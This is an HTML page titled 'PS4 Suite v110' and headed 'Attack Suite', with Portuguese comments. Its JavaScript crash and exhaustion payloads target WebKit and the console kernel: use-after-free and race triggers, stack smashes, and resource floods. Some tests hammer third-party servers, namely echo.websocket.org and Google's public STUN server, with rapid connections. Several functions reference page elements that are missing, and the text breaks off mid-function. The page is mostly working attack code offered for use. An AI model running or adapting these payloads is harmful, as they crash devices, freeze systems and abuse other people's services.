<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Suite v110</title> 
</head>
<body>

    <h1>Attack Suite</h1>

   
        <button onclick="runSelectionCrash()">TEST 1: Selection.deleteFromDocument UAF</button>
        <button onclick="runTextNodeRace()">TEST 2: SplitText vs Normalize Race</button>
        <button onclick="runIntlStack()">TEST 3: Intl.ListFormat Stack Smash</button>   
        <button class="kernel" onclick="runIceFlood()">TEST 4: WebRTC ICE Flood (UDP Panic)</button>
        <button class="kernel" onclick="runAudioHardware()">TEST 5: AudioContext Hardware Exhaustion</button>
        <button class="kernel" onclick="runInodeFlood()">TEST 6: Cache Storage Inode Flood</button>

        <button onclick="runTreeWalkerRace()">TEST 1: TreeWalker replaceChild UAF</button>
        <button onclick="runURLParamsSmash()">TEST 2: URLSearchParams Stack Smash</button>
        <button onclick="runGradientRace()">TEST 3: CanvasGradient Realloc Race</button>   
        <button class="kernel" onclick="runSocketCloseRace()">TEST 4: Socket Close Race (Net UAF)</button>
        <button class="kernel" onclick="runAtomicsUnmap()">TEST 5: Shared Buffer Unmap Panic</button>
        <button class="kernel" onclick="runDNSStack()">TEST 6: getaddrinfo Stack Overflow</button>

        <button onclick="runTreeWalkerException()">TEST 1: TreeWalker Filter Exception Jump</button>
        <button onclick="runShadowSelection()">TEST 2: Shadow DOM Selection UAF</button>
        <button onclick="runMapGCRace()">TEST 3: Map Iterator GC Race</button>   
        <button class="kernel" onclick="runCoherencyStress()">TEST 4: Cache Coherency Stress (Rwlock)</button>
        <button class="kernel" onclick="runNotificationBomb()">TEST 5: Notification Payload Overflow</button>
        <button class="kernel" onclick="runWCharSmash()">TEST 6: Libc WChar Conversion Smash</button>

        <button onclick="runCSSRuleFlood()">TEST 1: CSSStyleSheet InsertRule Overflow</button>
        <button onclick="runGradientStopFlood()">TEST 2: SVG Gradient Stop Buffer Overflow</button>
        <button onclick="runIntlFormatCrash()">TEST 3: Intl.RelativeTimeFormat Infinity Crash</button>
        <button class="kernel" onclick="runWorkerNameOverflow()">TEST 4: Worker Thread Name Kernel Overflow</button>
        <button class="kernel" onclick="runUDPFragmentFlood()">TEST 5: WebRTC UDP Fragmentation Flood</button>
        <button class="kernel" onclick="runTCPChurn()">TEST 6: Socket TIME_WAIT Exhaustion</button>

        <button onclick="runCSSMediaCrash()">TEST 1: CSS @media Recursion Bomb</button>
        <button onclick="runLocaleRecursion()">TEST 2: Array.toLocaleString Recursion</button>
        <button onclick="runNodeContainsUAF()">TEST 3: Node.contains UAF</button>        
        <button class="kernel" onclick="runJITFlood()">TEST 4: JIT Memory Map Exhaustion</button>
        <button class="kernel" onclick="runPathOverflow()">TEST 5: VFS Pathname Stack Smash</button>
        <button class="kernel" onclick="runUDPFlood()">TEST 6: WebRTC UDP Buffer Flood</button>

        <button onclick="runTemplateUAF()">TEST 1: Template Adoption UAF</button>
        <button onclick="runWeakSetCrash()">TEST 2: WeakSet GC Stack Smash</button>
        <button onclick="runCSSCycle()">TEST 3: CSS Variable Shadow Cycle</button>
        <button class="kernel" onclick="runGroupSmash()">TEST 4: console.group Stack Smash</button>
        <button class="kernel" onclick="runBlobRace()">TEST 5: Blob Revoke/Read Race</button>
        <button class="kernel" onclick="runIPCRing()">TEST 6: IPC Port Ring Deadlock</button>

        <button onclick="runSurroundCrash()">TEST 1: Range.surroundContents UAF</button>
        <button onclick="runTransitionFlood()">TEST 2: CSS Transition Property Explosion</button>
        <button onclick="runPipeRace()">TEST 3: Stream PipeTo Closure Race</button>
        <button class="kernel" onclick="runEventQExhaustion()">TEST 4: Kernel Event Queue Exhaustion</button>
        <button class="kernel" onclick="runSABThrash()">TEST 5: SharedBuffer Map/Unmap Thrash</button>
        <button class="kernel" onclick="runMbufChurn()">TEST 6: Socket Mbuf Fragmentation</button>

        <button onclick="runNormalizeUAF()">TEST 1: Range vs Normalize UAF</button>
        <button onclick="runCalcCrash()">TEST 2: CSS calc(Inf) Layout Storm</button>
        <button onclick="runStickyLoop()">TEST 3: RegExp Sticky JIT Freeze</button>
        <button class="kernel" onclick="runRecvFlood()">TEST 4: Socket Receive Buffer Exhaustion</button>
        <button class="kernel" onclick="runURLOverflow()">TEST 5: History URL IPC Overflow</button>
        <button class="kernel" onclick="runErrorFlood()">TEST 6: Console Error I/O Lock</button>

        <button onclick="runInsertUAF()">TEST 1: Node.insertBefore Reentrancy UAF</button>
        <button onclick="runCSSImport()">TEST 2: CSS @import Recursion Stack Smash</button>
        <button onclick="runRegexBytecode()">TEST 3: RegExp Interpreter Bytecode Overflow</button>
        <button class="kernel" onclick="runThreadDeadlock()">TEST 4: Pthread Join Deadlock Race</button>
        <button class="kernel" onclick="runSocketOverflow()">TEST 5: Socket Send Buffer Off-by-One</button>
        <button class="kernel" onclick="runBlobHandleRace()">TEST 6: Blob VFS Handle Leak</button>

        <button onclick="runCSSExponential()">TEST 1: CSS Variable Exponential Expansion</button>
        <button onclick="runSpeciesTrap()">TEST 2: Array Species Double-Free Trap</button>
        <button onclick="runFontIterCrash()">TEST 3: FontFaceSet Iterator Mutation</button>
        <button class="kernel" onclick="runDuplicateTransfer()">TEST 4: IPC Duplicate Transfer (Double Free)</button>
        <button class="kernel" onclick="runBlobRecursion()">TEST 5: Blob Deep Recursion (VFS Stack)</button>
        <button class="kernel" onclick="runSocketDeadlock()">TEST 6: Socket Buffer Deadlock</button>

        <button onclick="runTreeWalkerRace()">TEST 1: TreeWalker replaceChild UAF</button>
        <button onclick="runURLParamsSmash()">TEST 2: URLSearchParams Stack Smash</button>
        <button onclick="runGradientRace()">TEST 3: CanvasGradient Realloc Race</button>
        <button class="kernel" onclick="runSocketCloseRace()">TEST 4: Socket Close Race (Net UAF)</button>
        <button class="kernel" onclick="runAtomicsUnmap()">TEST 5: Shared Buffer Unmap Panic</button>
        <button class="kernel" onclick="runDNSStack()">TEST 6: getaddrinfo Stack Overflow</button>

        <button onclick="runStrcat()">TEST 1: strcat / op_strcat Overflow</button>
        <button onclick="runAsyncAssert()">TEST 2: AsyncGenerator Assertion Fail</button>
        <button onclick="runImportAssert()">TEST 3: Import Assertion Stack Smash</button>
        <button class="kernel" onclick="runUrandom()">TEST 4: /dev/urandom Entropy Starvation</button>
        <button class="kernel" onclick="runPreconnect()">TEST 5: LinkPreconnect Curl Flood</button>
        <button class="kernel" onclick="runBindCrash()">TEST 6: WebSocket Bind Conflict</button>

        <button onclick="runFormDataOverflow()">TEST 1: FormData strcat Buffer Overflow</button>
        <button onclick="runAsyncGenCrash()">TEST 2: AsyncGenerator Queue Assertion Fail</button>
        <button onclick="runURLProtocolCrash()">TEST 3: URL Protocol Setter Overflow</button>
        <button class="kernel" onclick="runCryptoExhaustion()">TEST 4: Crypto Key Storage Exhaustion</button>
        <button class="kernel" onclick="runPortEntangleRace()">TEST 5: MessagePort Entangle/Close Race</button>
        <button class="kernel" onclick="runBlobRevokeRace()">TEST 6: Blob Revoke During Read (VFS Panic)</button>

        <button onclick="runCopyWithinCrash()">TEST 1: Array copyWithin Proxy Trap (memmove)</button>
        <button onclick="runMatrixSmash()">TEST 2: DOMMatrix Stack Smash</button>
        <button onclick="runJSONHole()">TEST 3: JSON Parser Array Hole UAF</button>
        <button class="kernel" onclick="runAtomicFlood()">TEST 4: Atomics Bus Lock Flood (Hard Freeze)</button>
        <button class="kernel" onclick="runBlobDeep()">TEST 5: Blob Cluster Chain Stack Smash</button>
        <button class="kernel" onclick="runIPCPingPong()">TEST 6: MessagePort Ping-Pong Death</button>

        <button onclick="runLinkStrcat()">TEST 1: String.link 'strcat' Overflow</button>
        <button onclick="runDataViewRealloc()">TEST 2: DataView 'realloc' UAF</button>
        <button onclick="runRegexGroupSmash()">TEST 3: RegExp Group Name Stack Smash</button>    
        <button class="kernel" onclick="runBindExhaustion()">TEST 4: Socket 'bind' Port Exhaustion</button>
        <button class="kernel" onclick="runConsoleMalloc()">TEST 5: Console 'malloc' Fragmentation</button>
        <button class="kernel" onclick="runFileRace()">TEST 6: FileReader IO Race</button>

        <button onclick="runCookieOverflow()">TEST 1: Cookie Buffer Overflow (strcat)</button>
        <button onclick="runWindowNameCrash()">TEST 2: Window.name IPC Overflow</button>
        <button onclick="runDateParseStack()">TEST 3: Date.parse Stack Smash</button>
        <button class="kernel" onclick="runCachePathOverflow()">TEST 4: Cache Name Path Overflow (VFS)</button>
        <button class="kernel" onclick="runTransferFlood()">TEST 5: Transfer List Handle Exhaustion</button>
        <button class="kernel" onclick="runDebugFlood()">TEST 6: Console Debug Ring Buffer Flood</button>
   

    <div id="log">Status: Aguardando...</div>
    <div id="sandbox"></div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // --- TESTE 1: Selection.deleteFromDocument UAF ---
        function runSelectionCrash() {
            log("[WebKit] Iniciando Selection UAF...");
            const root = document.getElementById('sandbox');
            root.innerHTML = "<div><b>A</b><span>TEXTO PARA APAGAR</span><i>C</i></div>";
            const span = root.querySelector('span');
            
            // Seleciona o span
            const sel = window.getSelection();
            const range = document.createRange();
            range.selectNode(span);
            sel.removeAllRanges();
            sel.addRange(range);
            
            // Observador para intervir
            const obs = new MutationObserver(() => {
                log("Muta√ß√£o! Tentando corromper sele√ß√£o...");
                // Remove o pai ou altera a sele√ß√£o durante a dele√ß√£o
                root.innerHTML = "";
                // For√ßa layout
                document.body.offsetWidth; 
            });
            obs.observe(root, {childList: true, subtree: true});
            
            try {
                log("Executando deleteFromDocument...");
                // O C++ itera pelo range para deletar. O Observer tenta destruir o mundo.
                sel.deleteFromDocument();
                log("Selection API sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
            obs.disconnect();
        }

        // --- TESTE 2: SplitText vs Normalize Race ---
        function runTextNodeRace() {
            log("[WebKit] Iniciando TextNode Race...");
            const root = document.createElement('div');
            const t = document.createTextNode("A".repeat(10000));
            root.appendChild(t);
            document.body.appendChild(root);
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                try {
                    // 1. Divide
                    t.splitText(5000);
                    
                    // 2. Junta (Normalize) imediatamente
                    // Tenta criar confus√£o na lista ligada de n√≥s
                    root.normalize();
                    
                    // Restaura para o pr√≥ximo ciclo
                    if (root.childNodes.length > 1) root.innerHTML = "A".repeat(10000);
                    
                } catch(e) {}
                
                if (count > 1000) {
                    clearInterval(interval);
                    document.body.removeChild(root);
                    log("Teste TextNode finalizado.");
                }
            }, 0);
        }

        // --- TESTE 3: Intl.ListFormat Stack Smash ---
        function runIntlStack() {
            log("[WebKit] Iniciando Intl Stack Smash...");
            
            if (!window.Intl || !Intl.ListFormat) {
                log("Intl.ListFormat n√£o suportado.");
                return;
            }

            try {
                const fmt = new Intl.ListFormat('en', { style: 'long', type: 'conjunction' });
                const list = new Array(20000).fill("item"); // Lista gigante
                
                log("Formatando lista de 20k itens...");
                // A libc pode usar recurs√£o ou aloca√ß√£o de stack para juntar as strings
                const res = fmt.format(list);
                
                log("Formata√ß√£o conclu√≠da (Seguro). Length: " + res.length);
            } catch(e) {
                log("Erro Intl: " + e.message);
            }
        }

        // --- TESTE 4: WebRTC ICE Flood (Kernel) ---
        function runIceFlood() {
            log("[KERNEL] Iniciando ICE Flood (UDP)...");
            
            if (!window.RTCPeerConnection) return log("WebRTC n√£o suportado.");
            
            const conns = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria 10 conex√µes por ciclo
                for(let i=0; i<10; i++) {
                    const pc = new RTCPeerConnection({
                        iceServers: [{urls: "stun:stun.l.google.com:19302"}] // STUN p√∫blico
                    });
                    
                    // Cria DataChannel para for√ßar coleta de candidatos
                    pc.createDataChannel("flood");
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
                    
                    conns.push(pc);
                    count++;
                }
                
                if (count % 100 === 0) log(`Conex√µes P2P: ${count}`);
                
                if (count > 1000) {
                    clearInterval(interval);
                    log("Flood finalizado. Verifique rede.");
                    // N√£o fechamos para manter press√£o nos recursos
                }
            }, 50);
        }

        // --- TESTE 5: AudioContext Hardware Exhaustion (Kernel) ---
        function runAudioHardware() {
            log("[KERNEL] Esgotando Hardware de √Åudio...");
            
            const ctxs = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // Cria contextos reais (vinculados ao hardware)
                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
                    ctxs.push(ctx);
                    count++;
                    
                    // Tenta tocar um som para ativar o driver
                    const osc = ctx.createOscillator();
                    osc.connect(ctx.destination);
                    osc.start();
                    
                    log(`AudioContexts ativos: ${count}`);
                    
                } catch(e) {
                    log("Falha de Hardware (SUCESSO): " + e.message);
                    clearInterval(interval);
                    
                    // Tenta for√ßar um √∫ltimo para crashar
                    try { new AudioContext(); } catch(x){}
                }
            }, 100);
        }

        // --- TESTE 6: Cache Storage Inode Flood (Kernel) ---
        function runInodeFlood() {
            log("[KERNEL] Iniciando Inode Flood...");
            
            if (!window.caches) return log("Cache API off.");
            
            const data = new Response("x"); // 1 byte
            let count = 0;
            
            caches.open('inode-killer').then(cache => {
                const interval = setInterval(() => {
                    for(let i=0; i<50; i++) {
                        // Nomes de arquivos √∫nicos
                        cache.put('/inode_' + count + "_" + Math.random(), data.clone());
                        count++;
                    }
                    
                    if (count % 1000 === 0) log(`Arquivos criados: ${count}`);
                    
                    if (count > 50000) {
                        clearInterval(interval);
                        log("Flood finalizado. Verifique I/O.");
                    }
                }, 10);
            });
        }
 function runTreeWalkerRace() {
            log("[WebKit] Iniciando TreeWalker Race...");
            const root = document.createElement('div');
            root.innerHTML = "<span>A</span><b>B</b><i>C</i>";
            document.body.appendChild(root);
            
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
            walker.nextNode(); // root
            const target = walker.nextNode(); // span
            
            log("Walker posicionado em SPAN. Substituindo n√≥...");
            
            try {
                // O GOLPE: Substitui o n√≥ atual (SPAN) por um novo (DIV)
                // O Walker deve atualizar o seu ponteiro interno.
                const newNode = document.createElement('div');
                
                // Observador para tentar aceder ao n√≥ morto durante a troca
                target.addEventListener('DOMNodeRemoved', () => {
                    // Tenta mover o walker enquanto o n√≥ est√° a ser removido
                    walker.previousNode();
                });

                root.replaceChild(newNode, target);
                
                // Verifica se o walker ainda est√° vivo
                const current = walker.currentNode;
                log("Walker sobreviveu. Current: " + current.nodeName);
                
            } catch(e) {
                log("Erro Walker: " + e.message);
            }
            document.body.removeChild(root);
        }

        // --- TESTE 2: URLSearchParams Stack Smash ---
        function runURLParamsSmash() {
            log("[WebKit] Iniciando URLParams Smash...");
            
            try {
                // Cria query string com 500.000 chaves
                const keys = new Array(500000).fill("key=value").join("&");
                
                log(`Parseando query string de ${keys.length} bytes...`);
                
                // O parser iterativo pode ter limite de stack ou timeout
                const params = new URLSearchParams(keys);
                
                log("Parser terminou (Seguro).");
                
            } catch(e) {
                log("Erro URL: " + e.message);
            }
        }

        // --- TESTE 3: CanvasGradient Realloc Race ---
        function runGradientRace() {
            log("[WebKit] Iniciando Gradient Realloc...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                const grad = ctx.createLinearGradient(0, 0, 500, 500);
                
                // Adiciona stops iniciais
                grad.addColorStop(0, "red");
                grad.addColorStop(1, "blue");
                
                let i = 0;
                const interval = setInterval(() => {
                    i++;
                    // Adiciona stops dinamicamente para for√ßar realoca√ß√£o do vetor interno
                    grad.addColorStop(Math.random(), "green");
                    
                    // Tenta usar o gradiente simultaneamente
                    ctx.fillStyle = grad;
                    ctx.fillRect(0, 0, 500, 500);
                    
                    if (i > 5000) {
                        clearInterval(interval);
                        log("Teste Gradiente finalizado.");
                    }
                }, 0);
                
            } catch(e) {
                log("Erro Gradient: " + e.message);
            }
        }

        // --- TESTE 4: Socket Close Race (Kernel) ---
        function runSocketCloseRace() {
            log("[KERNEL] Iniciando Socket Close Race...");
            
            // Payload grande
            const data = new Uint8Array(1024 * 1024).fill(0x41);
            
            const interval = setInterval(() => {
                try {
                    // Abre socket
                    const ws = new WebSocket("wss://echo.websocket.org");
                    
                    ws.onopen = () => {
                        // Envia dados
                        ws.send(data);
                        // FECHA IMEDIATAMENTE
                        // Race: Kernel copiando dados vs fechando descritor
                        ws.close();
                    };
                    ws.onerror = () => {};
                    
                } catch(e) {}
            }, 10);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Teste Socket parado.");
            }, 5000);
        }

        // --- TESTE 5: Shared Buffer Unmap Panic (Kernel) ---
        function runAtomicsUnmap() {
            log("[KERNEL] Iniciando Atomics Unmap Panic...");
            
            if (!window.SharedArrayBuffer) return log("SAB n√£o suportado.");
            
            const sab = new SharedArrayBuffer(4096);
            const i32 = new Int32Array(sab);
            
            // 1. Lan√ßa threads que dormem na mem√≥ria (Kernel Wait Queue)
            for(let i=0; i<50; i++) {
                const w = new Worker(URL.createObjectURL(new Blob([`
                    onmessage = e => {
                        const i32 = new Int32Array(e.data);
                        Atomics.wait(i32, 0, 0); // Dorme
                    }
                `], {type:"text/javascript"})));
                w.postMessage(sab);
                
                // 2. O GOLPE: Mata o worker.
                // O Kernel tem de remover a thread da fila de espera e desmapear a mem√≥ria.
                // Se a ordem for errada (desmapear antes de acordar), Panic.
                setTimeout(() => w.terminate(), 100 + Math.random() * 100);
            }
            
            log("Race iniciada. Aguarde instabilidade.");
        }

        // --- TESTE 6: getaddrinfo Stack Overflow (Kernel) ---
        function runDNSStack() {
            log("[KERNEL] Iniciando DNS Stack Smash...");
            
            // Hostname gigante (maior que PATH_MAX)
            const host = "A".repeat(5000);
            
            try {
                log("Resolvendo hostname de 5000 chars...");
                // fetch usa getaddrinfo da libc/kernel
                fetch("http://" + host).catch(e => {});
                log("Syscall retornou (Seguro).");
            } catch(e) {
                log("Erro DNS: " + e.message);
            }
        }
 function runTreeWalkerException() {
            log("[WebKit] Iniciando TreeWalker Exception...");
            const root = document.createElement('div');
            root.innerHTML = "<div>A</div><div>B</div><div>C</div>";
            document.getElementById('sandbox').appendChild(root);
            
            const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
                acceptNode: function(node) {
                    log("Filtro visitando: " + node.tagName);
                    if (node.innerHTML === "B") {
                        log("Gatilho! Lan√ßando exce√ß√£o no filtro...");
                        // Remove o n√≥ para sujar o estado
                        node.remove(); 
                        // For√ßa unwind da stack C++
                        throw "Unwind C++ Stack Now"; 
                    }
                    return NodeFilter.FILTER_ACCEPT;
                }
            });

            try {
                // Itera at√© encontrar B e crashar
                while(walker.nextNode()) {}
                log("Walker sobreviveu.");
            } catch(e) {
                log("Exce√ß√£o capturada (Seguro): " + e);
                // Verifica se o walker ficou num estado inv√°lido
                try { walker.nextNode(); } catch(x) { log("Walker corrompido."); }
            }
            document.getElementById('sandbox').innerHTML = "";
        }

        // --- TESTE 2: Shadow DOM Selection UAF ---
        function runShadowSelection() {
            log("[WebKit] Iniciando Shadow Selection UAF...");
            const host = document.createElement('div');
            document.getElementById('sandbox').appendChild(host);
            const shadow = host.attachShadow({mode: 'open'});
            shadow.innerHTML = "<span>SHADOW CONTENT</span>";
            
            const sel = window.getSelection();
            const range = document.createRange();
            
            try {
                // Seleciona n√≥ dentro do Shadow DOM
                const target = shadow.firstChild;
                range.selectNode(target);
                sel.removeAllRanges();
                sel.addRange(range);
                
                log("Sele√ß√£o criada dentro do Shadow. Removendo Host...");
                
                // O GOLPE: Remove o host do DOM principal
                document.getElementById('sandbox').removeChild(host);
                
                // A sele√ß√£o agora aponta para um n√≥ dentro de uma raiz morta
                // Tenta manipular a sele√ß√£o
                const type = sel.type;
                log("Tipo de sele√ß√£o ap√≥s remo√ß√£o: " + type);
                
                // Tenta estender para for√ßar leitura
                sel.extend(document.body, 0);
                
            } catch(e) {
                log("Erro Selection: " + e.message);
            }
        }

        // --- TESTE 3: Map Iterator GC Race ---
        function runMapGCRace() {
            log("[WebKit] Iniciando Map Iterator GC Race...");
            const map = new Map();
            const keys = [];
            
            // Cria chaves objeto
            for(let i=0; i<10000; i++) {
                const k = {id: i};
                keys.push(k);
                map.set(k, i);
            }
            
            log("Iterando Map...");
            let count = 0;
            for(const [k, v] of map) {
                count++;
                if (count === 100) {
                    log("Gatilho! Libertando refer√™ncias de chaves...");
                    // Remove todas as refer√™ncias fortes √†s chaves
                    // O Map ainda as segura, mas se apagarmos do Map tamb√©m...
                    keys.length = 0; 
                    map.clear(); // Limpa o map no meio da itera√ß√£o
                    
                    // Aloca lixo
                    const trash = new Array(10000).fill(1.1);
                }
            }
            log("Itera√ß√£o conclu√≠da (Map size: " + map.size + ")");
        }

        // --- TESTE 4: Kernel Cache Coherency Stress (Kernel) ---
        function runCoherencyStress() {
            log("[KERNEL] Iniciando Coherency Stress...");
            
            if (!window.SharedArrayBuffer) return log("SAB necess√°rio.");
            
            const sab = new SharedArrayBuffer(16); // Pequeno para aumentar conten√ß√£o
            const i32 = new Int32Array(sab);
            
            // Worker Leitor (Muitos)
            const readerCode = `
                onmessage = e => {
                    const i32 = new Int32Array(e.data);
                    while(true) {
                        Atomics.load(i32, 0); // Leitura at√≥mica constante
                    }
                }
            `;
            
            // Worker Escritor (Um)
            const writerCode = `
                onmessage = e => {
                    const i32 = new Int32Array(e.data);
                    let v = 0;
                    while(true) {
                        Atomics.store(i32, 0, v++); // Escrita at√≥mica constante
                    }
                }
            `;
            
            const readerUrl = URL.createObjectURL(new Blob([readerCode], {type:"text/javascript"}));
            const writerUrl = URL.createObjectURL(new Blob([writerCode], {type:"text/javascript"}));
            
            // Lan√ßa 50 Leitores
            for(let i=0; i<50; i++) new Worker(readerUrl).postMessage(sab);
            
            // Lan√ßa 1 Escritor
            new Worker(writerUrl).postMessage(sab);
            
            log("51 Threads a lutar pela mesma linha de cache L1/L2.");
            log("O sistema pode congelar.");
        }

        // --- TESTE 5: Notification Payload Overflow (Kernel) ---
        function runNotificationBomb() {
            log("[KERNEL] Iniciando Notification Bomb...");
            
            if (!("Notification" in window)) return log("API off.");
            
            Notification.requestPermission().then(perm => {
                if (perm !== "granted") return log("Negado.");
                
                // Cria Blob de imagem gigante
                const size = 50 * 1024 * 1024; // 50MB
                const buffer = new Uint8Array(size).fill(0x41);
                const blob = new Blob([buffer], {type: "image/png"});
                const url = URL.createObjectURL(blob);
                
                log("Enviando notifica√ß√£o com √≠cone de 50MB...");
                
                // O sistema tenta serializar o blob para enviar ao processo VSH
                try {
                    new Notification("KERNEL STRESS", {
                        body: "Payload incoming...",
                        icon: url,
                        image: url // Tenta ambos
                    });
                    log("Notifica√ß√£o despachada.");
                } catch(e) {
                    log("Erro envio: " + e.message);
                }
            });
        }

        // --- TESTE 6: Libc WChar Conversion Smash (Kernel/Libc) ---
        function runWCharSmash() {
            log("[KERNEL/LIBC] Iniciando WChar Smash...");
            
            // Caracteres que expandem drasticamente ou causam problemas em UTF-16/32
            // Sequ√™ncias de Emojis complexos (ZWJ sequences)
            const toxic = "üë®‚Äçüë©‚Äçüëß‚Äçüë¶".repeat(10000); 
            
            try {
                log("For√ßando convers√£o de string complexa...");
                // encodeURI for√ßa convers√£o para UTF-8 escapado
                // Se a libc falhar no c√°lculo de buffer tempor√°rio -> Stack Overflow
                const res = encodeURI(toxic);
                
                log("Convers√£o OK. Length: " + res.length);
                
                // Tenta decodeURI com sequ√™ncia quebrada no final
                const broken = res.substring(0, res.length - 1);
                decodeURIComponent(broken);
                
            } catch(e) {
                log("Erro WChar: " + e.message);
            }
        }
function runCSSRuleFlood() {
            log("[WebKit] Iniciando CSS Rule Flood...");
            
            // Cria uma folha de estilo vazia
            const style = document.createElement('style');
            document.head.appendChild(style);
            const sheet = style.sheet;
            
            try {
                // Tenta inserir 100.000 regras
                // Limites comuns s√£o 65535 (uint16)
                const limit = 100000;
                
                // Usa requestAnimationFrame para n√£o travar a UI imediatamente
                let i = 0;
                function loop() {
                    for(let k=0; k<1000; k++) {
                        if (i >= limit) {
                            log("Limite atingido. Sheet length: " + sheet.cssRules.length);
                            document.head.removeChild(style);
                            return;
                        }
                        // Regra simples para ocupar mem√≥ria
                        sheet.insertRule(`.rule${i} { color: red; }`, i);
                        i++;
                    }
                    log(`Regras inseridas: ${i}`);
                    requestAnimationFrame(loop);
                }
                loop();
                
            } catch(e) {
                log("Erro CSS: " + e.message);
                document.head.removeChild(style);
            }
        }

        // --- TESTE 2: SVG Gradient Stop Buffer Overflow ---
        function runGradientStopFlood() {
            log("[WebKit] Criando SVG Gradient Stops...");
            const container = document.getElementById('svg-sandbox');
            container.innerHTML = "";
            
            const ns = "http://www.w3.org/2000/svg";
            const svg = document.createElementNS(ns, "svg");
            const defs = document.createElementNS(ns, "defs");
            const grad = document.createElementNS(ns, "linearGradient");
            grad.id = "crash-grad";
            
            // Adiciona 50.000 stops
            // O renderer precisa interpolar entre todos eles
            const fragment = document.createDocumentFragment();
            for(let i=0; i<50000; i++) {
                const stop = document.createElementNS(ns, "stop");
                stop.setAttribute("offset", (i/50000));
                stop.setAttribute("stop-color", i%2 ? "red" : "blue");
                fragment.appendChild(stop);
            }
            grad.appendChild(fragment);
            defs.appendChild(grad);
            svg.appendChild(defs);
            
            const rect = document.createElementNS(ns, "rect");
            rect.setAttribute("width", "100");
            rect.setAttribute("height", "100");
            rect.setAttribute("fill", "url(#crash-grad)");
            
            svg.appendChild(rect);
            container.appendChild(svg);
            
            log("Gradiente injetado. For√ßando render...");
            
            // For√ßa layout
            setTimeout(() => {
                const b = rect.getBBox();
                log("SVG Renderizado (Seguro).");
                container.innerHTML = "";
            }, 500);
        }

        // --- TESTE 3: Intl.RelativeTimeFormat Infinity Crash ---
        function runIntlFormatCrash() {
            log("[WebKit] Testando Intl Infinity...");
            
            try {
                // Tenta formatar valores infinitos e NaN em v√°rias unidades
                // Algumas implementa√ß√µes falham ao calcular a string plural correta para Infinity
                const fmt = new Intl.RelativeTimeFormat("en");
                
                const values = [Infinity, -Infinity, NaN, 1e100];
                const units = ["year", "quarter", "month", "week", "day", "hour", "minute", "second"];
                
                values.forEach(val => {
                    units.forEach(unit => {
                        const res = fmt.format(val, unit);
                        // Se n√£o crashou, loga (amostragem)
                        if (unit === "year") log(`Format(${val}): ${res}`);
                    });
                });
                
                log("Intl sobreviveu.");
                
            } catch(e) {
                log("Erro Intl: " + e.message);
            }
        }

        // --- TESTE 4: Worker Thread Name Kernel Overflow ---
        function runWorkerNameOverflow() {
            log("[KERNEL] Iniciando Thread Name Overflow...");
            
            // Nome gigante para estourar buffer de nome de thread do Kernel
            const hugeName = "THRD_" + "A".repeat(10000);
            
            try {
                const blob = new Blob(["postMessage('alive')"], {type: "text/javascript"});
                const url = URL.createObjectURL(blob);
                
                // O WebKit passa o nome para o sistema operacional (pthread_setname_np)
                const w = new Worker(url, { name: hugeName });
                
                w.onmessage = () => {
                    log("Worker iniciou (Kernel aceitou ou truncou o nome).");
                    w.terminate();
                };
                
            } catch(e) {
                log("Erro Worker: " + e.message);
            }
        }

        // --- TESTE 5: WebRTC UDP Fragmentation Flood ---
        function runUDPFragmentFlood() {
            log("[KERNEL] Iniciando UDP Fragment Flood...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pc1 = new RTCPeerConnection();
            const pc2 = new RTCPeerConnection();
            
            pc1.onicecandidate = e => e.candidate && pc2.addIceCandidate(e.candidate);
            pc2.onicecandidate = e => e.candidate && pc1.addIceCandidate(e.candidate);
            
            const dc = pc1.createDataChannel("flood");
            
            // Cria conex√£o local
            pc1.createOffer().then(o => pc1.setLocalDescription(o))
                .then(() => pc2.setRemoteDescription(pc1.localDescription))
                .then(() => pc2.createAnswer())
                .then(a => pc2.setLocalDescription(a))
                .then(() => pc1.setRemoteDescription(pc2.localDescription));
            
            dc.onopen = () => {
                log("Canal aberto. Enviando pacotes MAX size...");
                
                // Mensagem de 16KB (Max padr√£o seguro para DataChannel, mas for√ßa fragmenta√ß√£o IP)
                // Se aumentarmos para 64KB, for√ßa ainda mais o Kernel.
                const data = new Uint8Array(16 * 1024).fill(0x41);
                
                const interval = setInterval(() => {
                    if (dc.bufferedAmount < 1024 * 1024) { // Mant√©m 1MB em buffer
                        for(let i=0; i<50; i++) dc.send(data);
                    }
                }, 5);
                
                setTimeout(() => {
                    clearInterval(interval);
                    pc1.close(); pc2.close();
                    log("Flood UDP finalizado.");
                }, 5000);
            };
        }

        // --- TESTE 6: Socket TIME_WAIT Exhaustion ---
        function runTCPChurn() {
            log("[KERNEL] Iniciando TCP Socket Churn...");
            
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    // Abre e fecha conex√µes WebSocket rapidamente
                    // O Kernel deve manter o estado TIME_WAIT para cada uma
                    try {
                        const ws = new WebSocket("wss://echo.websocket.org");
                        ws.onopen = () => ws.close(); // Fecha assim que abre
                        ws.onerror = () => {};
                        count++;
                    } catch(e) {}
                }
                
                if (count % 500 === 0) log(`Ciclos TCP: ${count}`);
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("Teste finalizado. Verifique se a rede ainda funciona.");
                }
            }, 50);
        }
 function runCSSMediaCrash() {
            log("[WebKit] Iniciando CSS Media Recursion...");
            const style = document.createElement('style');
            
            // Gera @media { @media { ... } }
            const depth = 5000;
            let css = "";
            let closing = "";
            
            for(let i=0; i<depth; i++) {
                css += "@media all { ";
                closing += "}";
            }
            css += ".crash { color: red; }" + closing;
            
            log(`Injetando CSS de profundidade ${depth}...`);
            style.textContent = css;
            
            try {
                // O parser roda ao anexar
                document.head.appendChild(style);
                
                // For√ßa aplica√ß√£o
                const div = document.createElement('div');
                div.className = "crash";
                document.body.appendChild(div);
                getComputedStyle(div).color;
                
                log("Parser CSS sobreviveu.");
                document.head.removeChild(style);
                document.body.removeChild(div);
            } catch(e) {
